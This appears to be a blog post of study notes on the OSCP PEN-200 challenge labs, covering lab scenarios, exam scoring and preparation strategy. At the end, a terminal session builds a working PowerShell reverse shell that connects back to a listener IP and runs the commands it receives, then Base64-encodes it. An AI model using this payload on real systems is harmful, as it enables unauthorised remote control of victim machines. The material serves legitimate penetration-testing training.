PEN-200 Module 25 — Challenge Labs and Exam Strategy

Dec 31, 2023 • 176 min read • m4xx3d0ut

PEN-200 Module 25 — Challenge Labs and Exam Strategy

TLDR;

The challenge labs are where methodology meets endurance. These notes capture the practical prep pulled from the journal.

Lab Themes & Focus

Lab Scenario Highlights Skills Reinforced
1–3 Small perimeter, misconfigured services Enumeration discipline, chaining medium findings
4–6 Multi-subnet AD environment Pivoting, Kerberoasting, privesc
MedTech Realistic enterprise with OT crossover Reporting clarity, time-boxed decision making

Prepare playbooks per lab: expected initial access vectors, likely pivot paths, and cleanup steps.

Workflow Template

  1. Scope Review: confirm objectives, flag non-target systems, sync with teammates.
  2. Recon Blocks: 90-minute sprints (external ➜ internal ➜ privilege escalation). After each, update the status board.
  3. Exploit & Loot: document commands, evidence, and mitigation ideas immediately.
  4. Checkpoint Meetings: every 2 hours, assess progress vs. objectives; pivot if stuck.

Tooling & Automation

  • Build nmap profiles (nmap -sV -sC -oA scans/full, nmap --script vuln).
  • Pre-stage password cracking rigs (hashcat sessions, rules, wordlists) and remote share mapping scripts.
  • Maintain a scripts repo (./bin/collect-win.ps1, ./bin/enum-linux.sh) to reduce repetitive work.

Exam Simulation

  • Run 24-hour mock engagements: 12 hours operations + 12 hours reporting.
  • Create a report template aligned with OSCP submission requirements; fill it in during practice sessions.
  • Track break schedules, nutrition, and context switching—it matters more than you think during the real exam.

Mindset & Debrief

  • Log rabbit holes and how you exited them; review before the exam to avoid repeat traps.
  • Celebrate small wins (credential capture, service map) to maintain morale.
  • After each lab, write a debrief: what worked, what failed, remediation suggestions.

The challenge labs reward consistency. Follow your playbook, keep the team aligned, and you’ll walk into the OSCP exam with muscle memory instead of adrenaline.

25 Trying Harder: The Challenge Labs

  • PWK Challenge Lab Overview.
  • Challenge Lab Details.
  • The OSCP Exam Information.

25.1 PWK Challenge Lab Overview

  • Learn about the different kinds of Challenge Labs.
  • Obtain a high level overview of each scenario.
  • Understand how to treat the mock OSCP Challenge Labs.
Challenge Labs 1-3

There are two types of challenge labs.

The first 3 are called scenarios.

  • Each scenario consists of:
  • A set of networked machines.
  • A short background story that puts those machines in context.
  • Your goal is to access the Domain Administrator account on an AD domain.
  • While compromising as many machines on the network as possible.

In the same way Capstone Exercises test the learner on material from multiple learning units, as do the scenarios. Your level of uncertainty abou the network is high, as it would be IRL, and you will not know what machines are vulnerable to what types of attacks. Each of the 3 scenarios progressively increase complexity due to additional machines, subnetworks, and attack vectors.

You will not know that any specific machine is vulnerable in the first place.

  • Some will be dependent on:
  • Information.
  • Credentials.
  • Capabilities. that will be found on other machines, some may not be exploitable until after the DC is compromised.
High Level Scenario Overviews

Challenge Lab 1: MEDTECH: You have been tasked to conduct a penetration test for MEDTECH, a recently formed IoT healthcare startup. Your objective is to find as many vulnerabilities and misconfigurations as possible in order to increase their Active Directory security posture and reduce the attack surface.

Challenge Lab 2: RELIA: You are tasked with a penetration test of RELIA, an industrial company building driving systems for the timber industry. The target got attacked a few weeks ago and now wants to get an assessment of their IT security. Their goal is to find out if an attacker can breach the perimeter and get Domain Admin privileges in the internal network.

Challenge Lab 3: SKYLARK: Skylark Industries is an aerospace multinational corporation that performs research & development on cutting-edge aviation technologies. One of their major branch offices has recently been targeted by an Advanced Persistent Threat (APT) actor ransomware attack. For this reason, the company CISO now wishes to further shield Skylark Industries' attack surface. You have been tasked to conduct a preemptive penetration test towards their HQ infrastructure and find any vulnerability that could potentially jeopardize the company's trade secrets.

Please note that Challenge 3 is significantly more difficult than Challenges 1 & 2. It requires a substantial amount of pivoting, tunneling, looking for information on multiple targets and paying close attention to post-exploitation. It is beyond the scope of the OSCP exam. If preparing for the exam is your main objective, you may wish to work through Challenges 4, 5 & 6 before returning Challenge 3.

Challenge Labs 4-6

The second type of Challenge Lab is an OSCP like experience, each comprised of six OSCP machines, to provide a mock-exam experience that reflects the difficulty of the actual OSCP exam.

Each challenge contains 3 machines connected via AD and 3 standalone machines with no dependancies or intranet connections. Each standalone machine has a local.txt and proof.txt.

Challenge labs have no point value, bu on the exam standalone machines would be worth 20 points each for a total of 60 points. The AD set is worth 40 points and the entire domain must be compromised to receive any points at all.

The attack vectors are taught throughout PEN-200 or are leveraged in the first 3 challenge labs, however the requirements to trigger the vulns may differ from the exact techniques. You are expected to demonstrate exploitation techniques and modify them for the specific env.

A different approach is recommended compared to Challenges 1-3, the purpose of these challenges is to provide you with direct insight on the types of systems encountered during the exam. They are not all-encompassing and the exam may contain vectors that are not part of the challenges.

Monitor and manage your time as challenges 4-6 provide a self assessment of yourself, treat them as an opportunity to discover your own strenfths and weaknesses.

25.2 Challenge Lab Details

  • Understand how Client-Side simulations work.
  • Understand the concept of dependencies.
  • Learn about non-intentionally vulnerable machines.
  • Understand the lack of meaning inherent to IP address ordering.
  • Learn how routers and Network Address Translation affect the scenarios.
  • Understand how to treat credentials and password attacks.

Prepare PowerShell reverse shell payload with Base64 encoding.

┌──(operator㉿labhost)-[~/OffSec/medtech/medtech]
└─$ pwsh
PowerShell 7.2.6
Copyright (c) Microsoft Corporation.

https://aka.ms/powershell
Type 'help' to get help.


┌──(operator㉿labhost)-[/home/operator/OffSec/medtech/medtech]
└─PS> $Text = '$client = New-Object System.Net.Sockets.TCPClient("192.168.45.163",9999);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()'

┌──(operator㉿labhost)-[/home/operator/OffSec/medtech/medtech]
└─PS> $Bytes = [System.Text.Encoding]::Unicode.GetBytes($Text)

┌──(operator㉿labhost)-[/home/operator/OffSec/medtech/medtech]
└─PS> $EncodedText =[Convert]::ToBase64String($Bytes)

┌──(operator㉿labhost)-[/home/operator/OffSec/medtech/medtech]
└─PS> $EncodedText
